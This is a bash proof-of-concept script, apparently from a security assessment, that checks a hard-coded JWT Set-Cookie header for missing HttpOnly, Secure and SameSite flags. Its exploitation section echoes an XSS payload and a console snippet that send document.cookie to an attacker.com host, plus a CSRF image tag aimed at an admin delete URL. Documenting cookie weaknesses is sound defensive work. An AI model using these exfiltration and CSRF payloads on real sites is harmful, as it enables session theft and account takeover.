#!/bin/bash

# POC: Insecure JWT Cookie - Missing HttpOnly Flag (Version 3)
# This script simulates the vulnerable Set-Cookie response and demonstrates 
# how to detect and exploit the missing security flags

echo "=========================================="
echo "Insecure JWT Cookie POC - Vulnerability Validation"
echo "=========================================="
echo ""

# Simulated vulnerable Set-Cookie response from the application
# Based on evidence: Set-Cookie: auth_token=eyJ....; Path=/
VULNERABLE_SET_COOKIE="Set-Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxLCJ1c2VyX3R5cGUiOiJhZG1pbiJ9.SIGNATURE; Path=/"
SECURE_SET_COOKIE="Set-Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxLCJ1c2VyX3R5cGUiOiJhZG1pbiJ9.SIGNATURE; Path=/; HttpOnly; Secure; SameSite=Strict"

echo "[*] Step 1: Analyzing Vulnerable Set-Cookie Header"
echo "============================================"
echo ""
echo "Vulnerable Cookie:"
echo "  $VULNERABLE_SET_COOKIE"
echo ""

# Function to check cookie flags
check_cookie_flags() {
    local cookie="$1"
    local label="$2"
    
    echo "[*] Checking: $label"
    echo ""
    
    local has_httponly=false
    local has_secure=false
    local has_samesite=false
    
    if echo "$cookie" | grep -iq "HttpOnly"; then
        has_httponly=true
        echo "    [✓] HttpOnly: PRESENT"
    else
        echo "    [✗] HttpOnly: MISSING - VULNERABLE"
    fi
    
    if echo "$cookie" | grep -iq "Secure"; then
        has_secure=true
        echo "    [✓] Secure: PRESENT"
    else
        echo "    [✗] Secure: MISSING - VULNERABLE"
    fi
    
    if echo "$cookie" | grep -iq "SameSite"; then
        has_samesite=true
        echo "    [✓] SameSite: PRESENT"
    else
        echo "    [✗] SameSite: MISSING - VULNERABLE"
    fi
    
    echo ""
    
    # Return vulnerability status
    if [ "$has_httponly" = false ] || [ "$has_secure" = false ] || [ "$has_samesite" = false ]; then
        return 0  # Vulnerable
    else
        return 1  # Secure
    fi
}

check_cookie_flags "$VULNERABLE_SET_COOKIE" "VULNERABLE Cookie"
VULN_STATUS=$?

check_cookie_flags "$SECURE_SET_COOKIE" "SECURE Cookie (for comparison)"
SECURE_STATUS=$?

echo "[*] Step 2: Exploitation Demonstration"
echo "======================================"
echo ""

if [ $VULN_STATUS -eq 0 ]; then
    echo "[+] VULNERABILITY CONFIRMED - Cookie is exploitable"
    echo ""
    
    echo "Attack Scenario 1 - XSS Token Theft:"
    echo "  1. Attacker injects JavaScript: <script>fetch('http://attacker.com?token=' + document.cookie)</script>"
    echo "  2. Since HttpOnly is MISSING, JavaScript can access auth_token"
    echo "  3. JWT token is exfiltrated to attacker's server"
    echo "  4. Attacker uses stolen token to impersonate user"
    echo ""
    
    echo "Attack Scenario 2 - CSRF with Cookie:"
    echo "  1. Attacker creates malicious page: <img src='http://target.com/admin/delete'>"
    echo "  2. Since SameSite is MISSING, cookie is sent cross-site"
    echo "  3. Admin user visits attacker page while logged in"
    echo "  4. Delete request executes with admin's credentials"
    echo ""
    
    echo "Attack Scenario 3 - HTTP Interception:"
    echo "  1. User on public WiFi connects to http://target.com (not HTTPS)"
    echo "  2. Since Secure flag is MISSING, cookie is sent over HTTP"
    echo "  3. Attacker on same network intercepts traffic via MITM"
    echo "  4. JWT token is captured and can be replayed"
    echo ""
    
    echo "[*] Step 3: Proof of Concept - JavaScript Access"
    echo "=================================================="
    echo ""
    echo "In browser console, attacker could execute:"
    echo ""
    echo "  // Extract auth_token (works because HttpOnly is missing)"
    echo "  var cookies = document.cookie.split(';');"
    echo "  var authToken = cookies.find(c => c.trim().startsWith('auth_token='));"
    echo "  console.log('Stolen Token:', authToken);"
    echo ""
    echo "  // Send to attacker server"
    echo "  fetch('http://attacker.com/steal', {"
    echo "    method: 'POST',"
    echo "    body: JSON.stringify({token: authToken})"
    echo "  });"
    echo ""
    
    exit 0
else
    echo "[-] Cookie appears to have proper security flags"
    exit 1
fi